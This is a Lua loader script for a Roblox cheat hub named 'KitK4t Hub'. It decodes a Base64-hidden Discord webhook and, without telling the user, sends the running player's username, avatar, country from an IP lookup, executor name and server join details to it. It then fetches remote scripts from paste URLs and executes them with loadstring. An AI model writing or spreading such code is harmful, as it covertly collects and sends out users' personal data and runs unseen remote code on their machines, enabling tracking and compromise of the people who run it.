-----------------------------------------------------
-- CONFIG
-----------------------------------------------------
local BROOKHAVEN_PLACEID    = 4924922222
local TRAINING_PLACEID      = 16572004551
local CARDEALER_PLACEID     = 1554960397

local trainingUrl   = "https://api.rubis.app/v2/scrap/M6uqoNf0a8B7dsVX/raw"
local cardealerUrl  = "https://api.rubis.app/v2/scrap/KCHqlYKLFkFO0a4W/raw"
local brookhavenUrl = "https://api.rubis.app/v2/scrap/vk01i5gl1i7wg1tZ/raw"
local universalUrl  = "https://api.rubis.app/v2/scrap/xQcqCfCZHddaQr2R/raw"

-- Webhook em Base64 (GERADA CORRETAMENTE)
local encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTAxNzU5NzM3MTA4ODkzNi9TcEFTbERlVnNzcHplNG44OF93ZG1oN3FiTjVJY0RJYmh1cjI4THlydFVqMVhNLUlzbEJHWkdmdUNrenh1RU11UFoxeQ=="

-----------------------------------------------------
-- DECODIFICADOR BASE64 SIMPLES
-----------------------------------------------------

local function base64Decode(data)
    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    data = string.gsub(data, "[^"..b64.."=]", "")
    
    local result = ""
    for i = 1, #data, 4 do
        local chunk = data:sub(i, i+3)
        local n = 0
        for j = 1, 4 do
            local c = chunk:sub(j, j)
            if c == "=" then 
                n = n * 64
            else
                local pos = string.find(b64, c, 1, true)
                if pos then
                    n = n * 64 + (pos - 1)
                end
            end
        end
        
        local bytes = string.char(
            math.floor(n / 0x10000) % 0x100,
            math.floor(n / 0x100) % 0x100,
            n % 0x100
        )
        
        -- Remove bytes extras se tiver padding
        local pad = string.match(data, "=+$")
        if pad then
            local pcount = #pad
            bytes = bytes:sub(1, 4 - pcount)
        end
        
        result = result .. bytes
    end
    
    return result
end

-- Decodifica a webhook
local webhookUrl = base64Decode(encryptedWebhook)

-----------------------------------------------------
-- WEBHOOK
-----------------------------------------------------

local function getAvatarUrl(userId)
    local HttpService = game:GetService("HttpService")
    local avatarUrl = ""
    local success, result = pcall(function()
        local apiUrl = string.format(
            "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=%d&size=420x420&format=Png&isCircular=false",
            userId
        )
        local response = game:HttpGet(apiUrl)
        local data = HttpService:JSONDecode(response)
        if data and data.data and data.data[1] then
            avatarUrl = data.data[1].imageUrl or ""
        end
    end)
    return avatarUrl
end

local function sendWebhook()
    pcall(function()
        local HttpService = game:GetService("HttpService")
        local localPlayer = game:GetService("Players").LocalPlayer

        if not localPlayer then return end

        local username = localPlayer.Name
        local userId   = localPlayer.UserId
        local serverId = game.JobId
        local executor = getexecutorname and getexecutorname() or "Unknown"

        local mapName = "Unknown"
        pcall(function()
            local MarketplaceService = game:GetService("MarketplaceService")
            local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
            mapName = productInfo.Name or "Unknown"
        end)

        local country = "Unknown"
        pcall(function()
            local response = game:HttpGet("http://ip-api.com/json")
            local data = HttpService:JSONDecode(response)
            country = data.country or "Unknown"
        end)

        local avatarUrl = getAvatarUrl(userId)

        local teleport = string.format(
            'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
            game.PlaceId, serverId
        )

        local payload = {
            embeds = {
                {
                    title = "The user executed KitK4t Hub",
                    color = 0x1a4f7a,
                    thumbnail = { url = avatarUrl },
                    fields = {
                        { name = "👤 Username",      value = username, inline = false },
                        { name = "🗺️ Map Name",      value = mapName,  inline = false },
                        { name = "💻 Executor",      value = executor, inline = false },
                        { name = "🌍 Country",       value = country,  inline = false },
                        { name = "🔑 Server ID",     value = serverId, inline = false },
                        { name = "🌀 Teleport code", value = teleport, inline = false },
                    },
                    footer = { text = "KitK4t Hub logs" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }
            }
        }

        local jsonPayload = HttpService:JSONEncode(payload)
        
        local requestOptions = {
            Url     = webhookUrl,
            Method  = "POST",
            Headers = { 
                ["Content-Type"] = "application/json"
            },
            Body    = jsonPayload,
        }
        
        if syn and syn.request then
            syn.request(requestOptions)
        elseif http and http.request then
            http.request(requestOptions)
        elseif request then
            request(requestOptions)
        end
    end)
end

-----------------------------------------------------
-- FAST LOAD
-----------------------------------------------------
local function fastLoad(url)
    local successHttp, source = pcall(function()
        return game:HttpGet(url)
    end)

    if not successHttp or not source then
        warn("[KitK4t Hub] Falha ao carregar:", url)
        return
    end

    local successRun, err = pcall(function()
        loadstring(source)()
    end)

    if not successRun then
        warn("[KitK4t Hub] Erro ao executar script:", err)
    end
end

-----------------------------------------------------
-- DETECÇÃO DO JOGO
-----------------------------------------------------
local id = game.PlaceId

task.spawn(sendWebhook)

if id == BROOKHAVEN_PLACEID then
    fastLoad(brookhavenUrl)
elseif id == TRAINING_PLACEID then
    fastLoad(trainingUrl)
elseif id == CARDEALER_PLACEID then
    fastLoad(cardealerUrl)
else
    fastLoad(universalUrl)
end
